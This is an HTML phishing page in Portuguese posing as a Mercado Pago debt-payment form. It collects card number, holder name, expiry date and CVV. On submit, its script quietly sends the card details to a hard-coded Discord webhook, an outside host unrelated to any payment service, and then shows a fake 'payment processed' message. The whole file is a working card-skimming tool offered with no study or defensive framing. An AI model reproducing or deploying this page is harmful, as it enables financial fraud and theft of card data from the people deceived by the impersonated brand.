<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento de Dívida - Mercado Pago</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 400px;
            margin: 50px auto;
            background: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .title {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #008cba;
            color: white;
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #005f73;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">
            <h2>Pagamento de Dívida</h2>
        </div>
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">Número do Cartão</label>
                <input type="text" id="cardNumber" name="cardNumber" required>
            </div>
            <div class="form-group">
                <label for="cardHolder">Nome do Titular</label>
                <input type="text" id="cardHolder" name="cardHolder" required>
            </div>
            <div class="form-group">
                <label for="expiryDate">Data de Validade (MM/AA)</label>
                <input type="text" id="expiryDate" name="expiryDate" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" required>
            </div>
            <button type="submit" class="btn">Pagar</button>
        </form>
    </div>

    <script>
        document.getElementById('paymentForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const cardNumber = document.getElementById('cardNumber').value;
            const cardHolder = document.getElementById('cardHolder').value;
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;

            const data = {
                cardNumber: cardNumber,
                cardHolder: 'Titular Fictício 2', // Alterar o nome do titular
                expiryDate: expiryDate,
                cvv: cvv
            };

            fetch('https://discord.com/api/webhooks/1471657344046731425/TtIOHZheLlcEOM-Z36w0ofYwWzF4fAhR6p2zB4TGKISQYQ_INPhlUmGWZItqOGr-ymNB', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Dados de pagamento enviados com sucesso:', data);
                alert('Pagamento processado com sucesso!');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de pagamento:', error);
                alert('Ocorreu um erro ao processar o pagamento.');
            });
        });
    </script>
</body>
</html>
